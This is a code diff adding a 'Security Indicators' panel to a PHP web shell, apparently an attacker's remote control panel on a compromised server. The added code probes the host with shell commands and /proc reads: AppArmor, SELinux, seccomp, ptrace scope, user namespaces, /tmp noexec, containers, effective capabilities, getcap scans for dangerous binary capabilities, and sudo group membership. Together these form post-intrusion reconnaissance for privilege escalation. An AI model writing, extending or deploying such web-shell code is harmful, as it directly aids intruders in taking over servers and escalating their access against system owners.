@@ -506,6 +506,80 @@ switch ($_POST['go']) {
         $infos = array('Browser Info' => $_SERVER['HTTP_USER_AGENT'], 'Disabled Functions' => get_cfg_var("disable_functions") ? get_cfg_var("disable_functions") : '(None)', 'Disabled Class' => get_cfg_var("disable_classes") ? get_cfg_var("disable_classes") : '(None)', 'PHP.ini Path' => $phpini ? $phpini : '(None)', 'PHP Method' => php_sapi_name(), 'PHP Version' => PHP_VERSION, 'PHP PID' => getmypid(), 'Server IP' => $_SERVER['REMOTE_ADDR'], 'Encoding' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'Web Port' => $_SERVER['SERVER_PORT'], 'Root Directory' => $_SERVER['DOCUMENT_ROOT'], 'Shell Location' => $_SERVER['SCRIPT_FILENAME'], 'CGI Version' => $_SERVER['GATEWAY_INTERFACE'], 'Webmaster Email' => $_SERVER['SERVER_ADMIN'] ? $_SERVER['SERVER_ADMIN'] : '(None)', 'Disk Size' => size(disk_total_space('.')), 'Free Space' => size(disk_free_space('.')), 'Limit POST' => get_cfg_var("post_max_size"), 'Max Upload' => get_cfg_var("upload_max_filesize"), 'Limit Memory' => get_cfg_var("memory_limit"), 'Max Exec Time' => get_cfg_var("max_execution_time") . ' Second', 'Fsockopen Support' => function_exists('fsockopen') ? 'Yes' : 'No', 'Socket Support' => function_exists('socket_close') ? 'Yes' : 'No', 'Pcntl Support' => function_exists('pcntl_exec') ? 'Yes' : 'No', 'Curl Support' => function_exists('curl_version') ? 'Yes' : 'No', 'Zlib Support' => function_exists('gzclose') ? 'Yes' : 'No', 'FTP Support' => function_exists('ftp_login') ? 'Yes' : 'No', 'XML Support' => function_exists('xml_set_object') ? 'Yes' : 'No', 'GD_Library Support' => function_exists('imageline') ? 'Yes' : 'No', 'COM Formation Support' => class_exists('COM') ? 'Yes' : 'No', 'ODBC Components Support' => function_exists('odbc_close') ? 'Yes' : 'No', 'IMAP Mail Support' => function_exists('imap_close') ? 'Yes' : 'No', 'Safe Mode Support' => get_cfg_var("safemode") ? 'Yes' : 'No', 'URL Fopen Support' => get_cfg_var("allow_url_fopen") ? 'Yes' : 'No', 'Dynamic Libraries Support' => get_cfg_var("enable_dl") ? 'Yes' : 'No', 'Display Error Support' => get_cfg_var("display_errors") ? 'Yes' : 'No', 'Register Global Support' => get_cfg_var("register_globals") ? 'Yes' : 'No', 'Magic Quotes Support' => get_cfg_var("magic_quotes_gpc") ? 'Yes' : 'No', 'PHP Compiler' => $config ? $config : '(None)');
         echo '<div class="msgbox">' . $msg . '</div>';
         echo '<table class="tables"><tr><th style="width:26%;">Name</th><th>Parameter</th></tr>';
+        if (!$win) {
+            $sr = function($c) { $r = command($c . ' 2>/dev/null', THISDIR); return trim((string)$r['res']); };
+            $pself = (string)@file_get_contents('/proc/self/status');
+            // AppArmor
+            $aa = trim((string)@file_get_contents('/proc/sys/kernel/apparmor_enabled'));
+            if ($aa === '1') {
+                $aa_cnt = $sr("wc -l < /sys/kernel/security/apparmor/profiles");
+                $aa_disp = '<h1>ON</h1>' . ($aa_cnt ? ' (' . $aa_cnt . ' profiles)' : '');
+            } else {
+                $aa_disp = '<h2>OFF / N/A</h2>';
+            }
+            // SELinux
+            $sel = trim((string)@file_get_contents('/proc/sys/kernel/selinux'));
+            if ($sel === '1') {
+                $sel_mode = $sr('getenforce');
+                $sel_disp = $sel_mode ? '<h1>' . htmlspecialchars($sel_mode) . '</h1>' : '<h1>ON</h1>';
+            } else {
+                $sel_disp = '<h2>disabled</h2>';
+            }
+            // seccomp
+            preg_match('/Seccomp:\s*(\d+)/', $pself, $scm);
+            $sc = isset($scm[1]) ? $scm[1] : '';
+            $sc_disp = $sc === '0' ? '<h2>0 (off)</h2>' : ($sc !== '' ? '<b>' . $sc . ' (active)</b>' : 'N/A');
+            // ptrace_scope
+            $pt = trim((string)@file_get_contents('/proc/sys/kernel/yama/ptrace_scope'));
+            if ($pt === '0') $pt_disp = '<h2>0 &mdash; unrestricted</h2>';
+            elseif ($pt === '1') $pt_disp = '<b>1 &mdash; child only</b>';
+            elseif ($pt === '2') $pt_disp = '<h1>2 &mdash; admin only</h1>';
+            elseif ($pt === '3') $pt_disp = '<h1>3 &mdash; disabled</h1>';
+            else $pt_disp = $pt !== '' ? htmlspecialchars($pt) : '<h2>N/A (no Yama)</h2>';
+            // userns
+            $uns = trim((string)@file_get_contents('/proc/sys/kernel/unprivileged_userns_clone'));
+            if ($uns === '') $uns = trim((string)@file_get_contents('/proc/sys/user/max_user_namespaces'));
+            $uns_disp = $uns === '0' ? '<b>disabled</b>' : ($uns !== '' ? '<h2>enabled</h2>' : 'N/A');
+            // /tmp noexec
+            $mounts = (string)@file_get_contents('/proc/mounts');
+            $tmp_disp = preg_match('#\s/tmp\s\S+\s\S*noexec#', $mounts) ? '<h1>noexec</h1>' : '<h2>exec ok</h2>';
+            // container
+            $cg1 = (string)@file_get_contents('/proc/1/cgroup');
+            if (file_exists('/.dockerenv') || preg_match('/docker|lxc|containerd/i', $cg1)) {
+                $cont_disp = '<b>Docker / LXC</b>';
+            } elseif (@file_get_contents('/run/systemd/container')) {
+                $cont_disp = '<b>' . htmlspecialchars(trim((string)@file_get_contents('/run/systemd/container'))) . '</b>';
+            } else {
+                $cont_disp = 'none (bare-metal)';
+            }
+            // capabilities (self + interesting system binaries)
+            $cap_disp = 'N/A';
+            if (preg_match('/CapEff:\s*([0-9a-f]+)/i', $pself, $cm)) {
+                $cv = hexdec($cm[1]);
+                $cap_map = array(0=>'CHOWN',1=>'DAC_OVERRIDE',2=>'DAC_READ_SEARCH',6=>'SETUID',7=>'SETGID',12=>'NET_ADMIN',19=>'SYS_PTRACE',20=>'SYS_PACCT',21=>'SYS_ADMIN',23=>'SYS_CHROOT');
+                $found = array();
+                foreach ($cap_map as $bit => $n) { if ($cv & (1 << $bit)) $found[] = $n; }
+                $cap_disp = $found ? '<h2>' . implode(', ', $found) . '</h2>' : '(none effective)';
+            }
+            $sc_bins = $sr("getcap -r /usr /bin /sbin /lib 2>/dev/null | grep -E 'sys_admin|sys_ptrace|setuid|setgid|dac_override|net_raw' | head -5");
+            if ($sc_bins) $cap_disp .= ' &mdash; <b>syscap:</b> ' . nl2br(htmlspecialchars($sc_bins));
+            // sudo group
+            $id_out = $sr('id');
+            $sudo_disp = (preg_match('/\(sudo\)/', $id_out) || preg_match('/\bsudo\b/', $id_out))
+                ? '<h2>&#9650; YES &mdash; ' . htmlspecialchars($id_out) . '</h2>'
+                : htmlspecialchars($id_out);
+            echo '<tr style="background:#EEE685"><td colspan="2"><b>Security Indicators</b></td></tr>';
+            echo '<tr><td>AppArmor</td><td>' . $aa_disp . '</td></tr>';
+            echo '<tr><td>SELinux</td><td>' . $sel_disp . '</td></tr>';
+            echo '<tr><td>seccomp</td><td>' . $sc_disp . '</td></tr>';
+            echo '<tr><td>ptrace_scope</td><td>' . $pt_disp . '</td></tr>';
+            echo '<tr><td>userns</td><td>' . $uns_disp . '</td></tr>';
+            echo '<tr><td>/tmp noexec</td><td>' . $tmp_disp . '</td></tr>';
+            echo '<tr><td>Container</td><td>' . $cont_disp . '</td></tr>';
+            echo '<tr><td>Capabilities</td><td>' . $cap_disp . '</td></tr>';
+            echo '<tr><td>sudo group</td><td>' . $sudo_disp . '</td></tr>';
+            echo '<tr><td colspan="2" style="height:4px;background:#CCCCCC"></td></tr>';
+        }
         foreach ($infos as $name => $var) {
             echo '<tr><td>' . $name . '</td><td>' . $var . '</td></tr>';
         }
